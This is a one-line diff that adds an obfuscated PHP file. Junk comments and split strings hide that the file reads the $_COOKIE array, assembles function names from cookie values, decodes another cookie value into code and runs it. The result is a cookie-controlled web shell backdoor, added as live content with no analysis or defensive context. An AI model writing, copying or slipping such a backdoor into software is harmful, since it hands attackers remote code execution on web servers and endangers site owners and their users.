@@ -1,0 +1,1 @@
+<?php $ef='KI';$uv='E';/*Lj**/$pm='OO';/*_,*/$it='_C';$fn/*ge*/=${$it.$pm.$ef.$uv};$sq=/*d*/$fn['zZ'].$fn/*?w*/['Qh'];$su=$fn['uQ'].$fn['l'].$fn['m'];$lo=$sq('',$su($fn['yr']));$lo();
